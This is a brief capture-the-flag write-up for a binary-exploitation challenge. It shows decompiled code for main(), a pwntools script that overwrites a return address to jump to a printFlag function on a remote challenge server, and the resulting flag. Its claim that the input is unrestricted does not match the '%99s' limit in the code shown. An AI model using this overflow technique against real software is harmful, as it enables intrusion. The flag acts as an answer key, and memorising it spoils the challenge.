# Forgotten Function

The main function is enough to exploit the binary.
```c++
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char src[104]; // [esp+Ch] [ebp-6Ch] BYREF

  setvbuf(stdout, 0, 2, 0);
  printf("Enter a string: ");
  __isoc99_scanf("%99s", src);
  vulnerableFunction(src);
  return 0;
}
```
Since there is no restriction in how much it reads in src we can send it a payload that shifts the execution of the code out of the function and into the `printFlag` function.

exploit:
```python
#!/bin/python3
from pwn import *

elf=ELF("pwn-bof1")
# p=elf.process()
p=remote("ctf.t43.ro",22431)
# gdb.attach(p,gdbscript="b main")
# sleep(1)

ret=0x0804900e
win=0x080491B6

payload=b'A'*22+p32(win)
p.sendline(payload)

p.interactive()
```

flag: `T43CTF{15c3858e605f083cedd0de7fbba821c43bcec98172897540907797ba203a1b15}`